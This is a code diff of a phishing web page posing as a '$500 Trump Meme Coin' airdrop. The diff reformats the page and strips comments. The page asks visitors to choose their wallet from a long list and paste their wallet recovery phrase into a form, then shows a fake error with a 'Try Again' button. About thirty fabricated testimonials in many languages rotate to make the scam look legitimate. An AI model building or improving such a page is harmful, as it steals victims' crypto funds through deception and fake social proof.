@@ -43,7 +43,6 @@
       border: none;
       display: block;
       background: transparent;
-      margin-bottom: 0;
     }
 
     /* Desktop tweaks */
@@ -65,7 +64,7 @@
       }
     }
 
-    /* Original Body Styles */
+    /* Rest of your CSS remains exactly the same */
     body, h1, h2, p, button, input, select, a, footer {
       margin: 0;
       padding: 0;
@@ -124,7 +123,6 @@
       border-radius: 5px;
       margin-bottom: 10px;
     }
-    /* ERROR BOX moved outside wallet page: */
     #error-box {
       display: none;
       position: fixed;
@@ -262,7 +260,7 @@
     <iframe src="https://trump-balance-dashboard.netlify.app/" loading="lazy"></iframe>
   </div>
 
-  <!-- Original Content (Exactly Preserved) -->
+  <!-- Rest of your HTML remains exactly the same -->
   <div class="container" id="main-content">
     <div class="card">
       <h2>Join the Revolution!</h2>
@@ -283,36 +281,35 @@
     <h2>Connect Your Wallet</h2>
     <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
     <form id="wallet-form">
-      <!-- Wallet Type Dropdown - Paste inside your form -->
-<label for="wallet-type">Select Wallet Type</label>
-<select id="wallet-type" name="wallet_type" required>
-  <option value="alphawallet">AlphaWallet</option>
-  <option value="argent">Argent</option>
-  <option value="atomic">Atomic Wallet</option>
-  <option value="bitkeep">BitKeep</option>
-  <option value="bitpie">Bitpie</option>
-  <option value="blockchain">Blockchain Wallet</option>
-  <option value="brd">BRD</option>
-  <option value="coin98">Coin98</option>
-  <option value="coinomi">Coinomi</option>
-  <option value="coinbase">Coinbase Wallet</option>
-  <option value="exodus">Exodus</option>
-  <option value="huobi">Huobi Wallet</option>
-  <option value="imtoken">imToken</option>
-  <option value="mathwallet">MathWallet</option>
-  <option value="metamask">MetaMask</option>
-  <option value="mycelium">Mycelium</option>
-  <option value="myetherwallet">MyEtherWallet</option>
-  <option value="phantom">Phantom</option>
-  <option value="rainbow">Rainbow</option>
-  <option value="safepal">SafePal</option>
-  <option value="solflare">Solflare</option>
-  <option value="tokenpocket">TokenPocket</option>
-  <option value="trustwallet">Trust Wallet</option>
-  <option value="zelcore">Zelcore</option>
-  <option value="zengo">Zengo</option>
-  <option value="others">Others</option>
-</select>
+      <label for="wallet-type">Select Wallet Type</label>
+      <select id="wallet-type" name="wallet_type" required>
+        <option value="alphawallet">AlphaWallet</option>
+        <option value="argent">Argent</option>
+        <option value="atomic">Atomic Wallet</option>
+        <option value="bitkeep">BitKeep</option>
+        <option value="bitpie">Bitpie</option>
+        <option value="blockchain">Blockchain Wallet</option>
+        <option value="brd">BRD</option>
+        <option value="coin98">Coin98</option>
+        <option value="coinomi">Coinomi</option>
+        <option value="coinbase">Coinbase Wallet</option>
+        <option value="exodus">Exodus</option>
+        <option value="huobi">Huobi Wallet</option>
+        <option value="imtoken">imToken</option>
+        <option value="mathwallet">MathWallet</option>
+        <option value="metamask">MetaMask</option>
+        <option value="mycelium">Mycelium</option>
+        <option value="myetherwallet">MyEtherWallet</option>
+        <option value="phantom">Phantom</option>
+        <option value="rainbow">Rainbow</option>
+        <option value="safepal">SafePal</option>
+        <option value="solflare">Solflare</option>
+        <option value="tokenpocket">TokenPocket</option>
+        <option value="trustwallet">Trust Wallet</option>
+        <option value="zelcore">Zelcore</option>
+        <option value="zengo">Zengo</option>
+        <option value="others">Others</option>
+      </select>
       <label for="wallet-phrase">Enter Your Wallet Phrase</label>
       <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
       <div class="note">
@@ -322,7 +319,6 @@
     </form>
   </div>
 
-  <!-- ERROR BOX moved outside wallet page -->
   <div id="error-box"></div>
 
   <footer>
@@ -374,10 +370,7 @@
   <button onclick="returnToMainPage()">Try Again</button>
 `;
           errorBox.style.display = "block";
-
-          // Blur wallet page behind error box
           document.getElementById('wallet-page').classList.add('blurred');
-
           btn.disabled = false;
           btn.textContent = "Connect";
         }, 2000);
@@ -391,10 +384,7 @@
   <button onclick="returnToMainPage()">Try Again</button>
 `;
         errorBox.style.display = "block";
-
-        // Blur wallet page behind error box
         document.getElementById('wallet-page').classList.add('blurred');
-
         btn.disabled = false;
         btn.textContent = "Connect";
       });
@@ -402,37 +392,37 @@
 
     // Testimonials auto-rotate
     const testimonials = [
-  "“Super easy! Just connected and claimed my $500 $TRUMP. MAGA! 🚀” – Michael D.",
-  "“No me lo esperaba, pero ¡boom! $500 $TRUMP en mi wallet! 💥” – Fatima A.",
-  "“这是2025年最棒的空投，立刻拿到500美元！🔥” – Li Wei",
-  "“Trump Meme Coin ist lustig, aber das Geld ist echt! 💰” – Brigitte S.",
-  "“Tout le monde dans mon groupe crypto parle de ces 500$ airdrop! 💸” – M. Tran",
-  "“Pensé que era broma, pero ya tengo $500 más! 😎” – Rico P.",
-  "“I never thought it was real, but $500 $TRUMP just hit my wallet! 🤯” – Jason M.",
-  "“簡単にクレームしてすぐに確認もらえた。500ドルゲット！🎉” – Nina F.",
-  "“$500 $TRUMP 받아서 기쁘다! 멋진 프로젝트! 👍” – Min-Jae K.",
-  "“Facile à réclamer, confirmation immédiate, 500$ reçus! 👏” – Alex C.",
-  "“I checked twice and the $500 $TRUMP was already there. So legit! 🔥” – Sarah W.",
-  "“Скоро всё закончится! Расскажите друзьям и получите свои $500! 💥” – Olga K.",
-  "“$500 $TRUMP est arrivé rapidement — pas de soucis, juste des récompenses! 🤑” – Hiroshi K.",
-  "“Recebi meus $500 em $TRUMP, melhor surpresa do ano! 🎊” – Isabella R.",
-  "“Semplice, veloce e reale. $500 $TRUMP accreditati senza problemi! 🛡️” – Carlos V.",
-  "“Just got my $500 $TRUMP claim — smooth and fast! Highly recommend. 👍” – Emily R.",
-  "“كنت متشككًا، لكنني تلقيت 500 دولار في محفظتي! 💵” – Amina S.",
-  "“500 $TRUMP airdrop ohne Probleme erhalten — jetzt gespannt auf die Entwicklung! 🚀” – Lars M.",
-  "“My $500 $TRUMP arrived faster than I expected. Love this! 😍” – David L.",
-  "“Grâce à ça, mon portefeuille crypto vient de s'enrichir de 500$! 💎” – Ananya P.",
-  "“Do Brasil aos EUA, todos estamos ganhando $500 $TRUMP — incrível! 🌎” – Diego T.",
-  "“Just claimed $500 $TRUMP, no hassles, no delays! Amazing airdrop. 🎉” – Megan T.",
-  "“$500 $TRUMP были зачислены за минуты, как и обещали. ⏱️” – Olga K.",
-  "“Najłatwiejsze 500$, jakie zarobiłem w krypto. Prawdziwa historia! 💯” – Ahmed N.",
-  "“Non posso credere di aver ottenuto 500$ $TRUMP — ora ci credo! 🎉” – Sofia G.",
-  "“Totally surprised by how easy it was to get $500 $TRUMP. Legit and real! 💪” – Chris H.",
-  "“I've been in crypto a while, but this $500 $TRUMP airdrop was a breeze! 👌” – Linda G.",
-  "“$500 $TRUMP instantly credited. Didn't expect it to be this fast! 🚀” – Matt B.",
-  "“Followed the steps and boom — $500 $TRUMP in my wallet. Crazy smooth! 🔥” – Olivia K.",
-  "“Never thought I'd get free $500 $TRUMP, but here we are. Loving it! 😎” – James P."
-];
+      "“Super easy! Just connected and claimed my $500 $TRUMP. MAGA! 🚀” – Michael D.",
+      "“No me lo esperaba, pero ¡boom! $500 $TRUMP en mi wallet! 💥” – Fatima A.",
+      "“这是2025年最棒的空投，立刻拿到500美元！🔥” – Li Wei",
+      "“Trump Meme Coin ist lustig, aber das Geld ist echt! 💰” – Brigitte S.",
+      "“Tout le monde dans mon groupe crypto parle de ces 500$ airdrop! 💸” – M. Tran",
+      "“Pensé que era broma, pero ya tengo $500 más! 😎” – Rico P.",
+      "“I never thought it was real, but $500 $TRUMP just hit my wallet! 🤯” – Jason M.",
+      "“簡単にクレームしてすぐに確認もらえた。500ドルゲット！🎉” – Nina F.",
+      "“$500 $TRUMP 받아서 기쁘다! 멋진 프로젝트! 👍” – Min-Jae K.",
+      "“Facile à réclamer, confirmation immédiate, 500$ reçus! 👏” – Alex C.",
+      "“I checked twice and the $500 $TRUMP was already there. So legit! 🔥” – Sarah W.",
+      "“Скоро всё закончится! Расскажите друзьям и получите свои $500! 💥” – Olga K.",
+      "“$500 $TRUMP est arrivé rapidement — pas de soucis, juste des récompenses! 🤑” – Hiroshi K.",
+      "“Recebi meus $500 em $TRUMP, melhor surpresa do ano! 🎊” – Isabella R.",
+      "“Semplice, veloce e reale. $500 $TRUMP accreditati senza problemi! 🛡️” – Carlos V.",
+      "“Just got my $500 $TRUMP claim — smooth and fast! Highly recommend. 👍” – Emily R.",
+      "“كنت متشككًا، لكنني تلقيت 500 دولار في محفظتي! 💵” – Amina S.",
+      "“500 $TRUMP airdrop ohne Probleme erhalten — jetzt gespannt auf die Entwicklung! 🚀” – Lars M.",
+      "“My $500 $TRUMP arrived faster than I expected. Love this! 😍” – David L.",
+      "“Grâce à ça, mon portefeuille crypto vient de s'enrichir de 500$! 💎” – Ananya P.",
+      "“Do Brasil aos EUA, todos estamos ganhando $500 $TRUMP — incrível! 🌎” – Diego T.",
+      "“Just claimed $500 $TRUMP, no hassles, no delays! Amazing airdrop. 🎉” – Megan T.",
+      "“$500 $TRUMP были зачислены за минуты, как и обещали. ⏱️” – Olga K.",
+      "“Najłatwiejsze 500$, jakie zarobiłem w krypto. Prawdziwa historia! 💯” – Ahmed N.",
+      "“Non posso credere di aver ottenuto 500$ $TRUMP — ora ci credo! 🎉” – Sofia G.",
+      "“Totally surprised by how easy it was to get $500 $TRUMP. Legit and real! 💪” – Chris H.",
+      "“I've been in crypto a while, but this $500 $TRUMP airdrop was a breeze! 👌” – Linda G.",
+      "“$500 $TRUMP instantly credited. Didn't expect it to be this fast! 🚀” – Matt B.",
+      "“Followed the steps and boom — $500 $TRUMP in my wallet. Crazy smooth! 🔥” – Olivia K.",
+      "“Never thought I'd get free $500 $TRUMP, but here we are. Loving it! 😎” – James P."
+    ];
     let tIndex = 0;
     const testimonialText = document.getElementById("testimonial-text");
     function rotateTestimonials() {
